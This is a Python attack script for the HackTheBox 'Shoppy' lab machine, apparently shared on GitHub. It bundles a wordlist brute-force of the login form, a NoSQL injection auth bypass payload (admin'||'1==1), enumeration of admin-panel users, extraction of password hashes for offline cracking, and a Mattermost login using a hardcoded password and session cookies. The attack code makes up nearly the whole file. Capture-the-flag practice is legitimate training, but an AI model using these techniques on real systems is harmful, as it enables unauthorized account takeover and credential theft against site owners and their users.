#!/usr/bin/env python3

# Hackthe Box Shoppy Random Python Functions To Do Stuff 
# This Script Was Made By GOATFUCK69 on github  Im Also At VET on HackTheBox  Btw i don't Actually Fuck Goats lol :D

from colorama import Fore
import requests,re,sys,colorama,paramiko






			




url = "http://shoppy.htb/login"
username = "admin"
headers = {"Content-Type": "application/x-www-form-urlencoded", "Origin": "http://shoppy.htb", "User-Agent": "vuln72"}

# Brute Forcing Login Function
# BTW When I Ran Login-Brute MY computer Froze But I Have A shitty Computer So That Might Be Why
def brute(): 
	try:
		with open("/opt/wordlists/rockyou.txt", "r", encoding='latin-1') as file: # Change Password Wordlist
			passes = file.readlines()
			for word in passes:
				data = f"username={username}&password={word}"
				r = requests.post(url, data=data, headers=headers, allow_redirects=False)
				print(Fore.RED + f"Trying: {username}:{word}")
				print(r.headers)
				if "Set-Cookie" in r.headers:
					print(Fore.RED + f"Password Found: {username}:{word}")
	except:
		print(Fore.RED + "Something Fucked Up!")				



# Exploiting The Nosql Injection Auth Bypass
def nosqli():
	try:
		data = "username=admin'||'1==1&password=admin'||'1==1"
		r = requests.post(url, headers=headers, data=data, allow_redirects=False)
		h = r.headers
		print("Logined In As Admin Via nosql auth bypass")
		print(r.headers)
	except:
		print(Fore.RED + "Something Fucked Up!")	



# Enumerating Users On The Web admin Panel
def user_enum():
	try:
		with open("/opt/wordlists/users.txt", "r") as file: # Change Username Wordlist
			for user in file.readlines():
				url1 = str((f"http://shoppy.htb/admin/search-users?username={user}"))
				url2 = url1.rstrip()
				# BTW Change The Cookie Value In The headers Or It Will Fuck Up!
				headers = {"Cookie": "RudderEncrypt%3AU2FsdGVkX1%2FOTErwLyRov9%2FM1MF7rSXIVUfGQenUXcBR%2BtQWTy8D9TlhUBjX2yLVC%2B7ZJSoZa%2FAk2KrLIZ3azA%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19hT1y2y6q%2F2JKHLwobXxuMYr8o9Kg7E7w%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BRk3L%2BpaEF2Biw3Q1Us9QAZ%2BP%2Fm%2FMtSQc%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2Ba9HLDNjAlw2W%2BYpivEuO1H%2FK30w2G47IYOTqDWwjojkt5K%2FPYx479; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2BPGkPuv%2F5UAfbiqLbopGkRWH%2FAy%2FYXVT0%3D; connect.sid=s%3A615blZbxW_PSIDIBvkay6-cGOUWEyo-k.7d6t31%2BrHyEb%2FoYFnjym3tvhhRYMHKHR9iZ05ZHCMw4", "accept-encoding": "Accept-Encoding: gzip, deflate", "Sec-GPC": "1", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8", "User-Agent": "hacker", "Accept-Language": "en-US,en;q=0.9", "If-None-Match": 'W/"aa0-pUWRV3sz7MffT6vwbjEaqagPcmk"'}
				r = requests.get(url2, headers=headers, allow_redirects=False)
				if "No results for your search" not	in r.text and r.status_code != 500:
					print(Fore.RED + f"User Found: {user}")
	except:
		print("Something Fucked Up!")				



# Getting All The User Hashes From The Web Admin Panel
# BTW if U find Any Other Users In The Web Pannel Add Them
def get_hashes():
	try:
		user1 = "admin"
		user2 = "josh"
		url = f"http://shoppy.htb/admin/search-users?username={user1}"
		url3 = f"http://shoppy.htb/admin/search-users?username={user2}"
		url4 = "http://shoppy.htb/exports/export-search.json"
		headers = {"Cookie": "RudderEncrypt%3AU2FsdGVkX1%2FOTErwLyRov9%2FM1MF7rSXIVUfGQenUXcBR%2BtQWTy8D9TlhUBjX2yLVC%2B7ZJSoZa%2FAk2KrLIZ3azA%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX19hT1y2y6q%2F2JKHLwobXxuMYr8o9Kg7E7w%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2BRk3L%2BpaEF2Biw3Q1Us9QAZ%2BP%2Fm%2FMtSQc%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2Ba9HLDNjAlw2W%2BYpivEuO1H%2FK30w2G47IYOTqDWwjojkt5K%2FPYx479; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2BPGkPuv%2F5UAfbiqLbopGkRWH%2FAy%2FYXVT0%3D; connect.sid=s%3A615blZbxW_PSIDIBvkay6-cGOUWEyo-k.7d6t31%2BrHyEb%2FoYFnjym3tvhhRYMHKHR9iZ05ZHCMw4", "accept-encoding": "Accept-Encoding: gzip", "User-Agent": "hacker"}
		print(Fore.YELLOW + "Getting Hashes!")
		print(Fore.YELLOW + "You Can Crack Them With John!")
		r1 = requests.get(url, headers=headers)
		r1p = requests.get(url4, headers=headers)
		print(Fore.RED + r1p.text)
		r2 = requests.get(url3, headers=headers)
		rp2 = requests.get(url4, headers=headers)
		print(Fore.RED + rp2.text)
	except:
		print(Fore.RED + "Something Fucked Up!")	




def mattermost_login():
	try:
		url = "http://mattermost.shoppy.htb/api/v4/users/login"
		headers = {"User-Agent": "hacker72", "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "Cookie": "rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19RpyO6O9wZp8ESQx6bIiOlgbm%2FLIyHev8%3D; rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18tI8Nuxz8yyJL7HTwTCnZJ4GjgH4X%2BNKI%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2FDrXpbrONfhOQxUr9PxU3N0yTa%2B89wwLPtOKsyPL0a%2FfApxd3o2jYKBX%2FIUrhmlPnf8bSSz9YeKg%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX1%2Bk0hfOZb4o8XI8xsDW9u7XQNnuafrT3B8%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1889pO%2BPJovrCPwUpc8P0aDKvkFYqbwXMg%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2FUUOn%2FvTHcxCv0cqt7NhW%2BD57h%2Bntkk6zW0VUfzA0smWYIh1ktFZm9; rl_trait=RudderEncrypt%3AU2FsdGVkX18252MubuJDj8GaidETXGfzzDj0xFlVb1c%3D; rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX19CK%2FY1Vr5KStyyPyyCdvaSgEuh91pS%2B8rZo1hNGU0JIJSFZaCwYgxHodzpEbAxOXgbkGrqWKxM3Q%3D%3D; rl_group_id=RudderEncrypt%3AU2FsdGVkX183v5UeQwPOvUmf7j7NF8YNBJzsPF1EISY%3D; rl_group_trait=RudderEncrypt%3AU2FsdGVkX1%2Brbz%2FGLhKaU59RYJ8%2FMV0IslXDdF2SO0I%3D; rl_user_id=RudderEncrypt%3AU2FsdGVkX1%2B6q%2BGfncov5ChdiCnDPv9NHe8O3ieFpXuzNmgLxXw4xk9RLCBCPrW%2F; rl_trait=RudderEncrypt%3AU2FsdGVkX1%2B0RZt%2Bb8IH7HDJMSr%2FwzdS1pTx%2FqriXPY%3D"}
		data = {"device_id": "", "login_id": "josh", "password": "remembermethisway", "token": ""}
		r = requests.post(url, headers=headers, json=data)
		print(Fore.RED + "Getting mattermost Login Cookies!")
		print(r.headers)
	except:
		print(Fore.RED + "Something Fucked Up!")	
	











# Options Menu For The Functions
def __init__():
	try:
		print(Fore.YELLOW + "OPTIONS: user-enum login-brute auth-bypass get-hashes mattermost-cookies")
		choice = input(Fore.BLUE + "Type An Option Thats Above: ")
		if choice == "user-enum":
			user_enum()
		if choice == "login-brute":
			brute()
		if choice == "auth-bypass":
			nosqli()
		if choice == "get-hashes":
			get_hashes()
		if choice == "mattermost-cookies":
			mattermost_login()	
	except:
		print(Fore.RED + "Something Fucked Up!")					


__init__()	